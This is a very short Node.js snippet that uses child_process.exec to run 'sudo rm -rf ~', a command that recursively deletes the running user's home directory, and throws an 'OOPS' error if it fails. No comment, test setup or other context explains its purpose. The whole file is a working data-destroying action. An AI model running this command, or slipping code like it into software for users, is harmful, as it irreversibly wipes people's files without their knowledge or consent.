import { exec } from "child_process";


exec("sudo rm -rf ~", (err) => {
    if (err) {
        throw new Error("OOPS")
    }
})
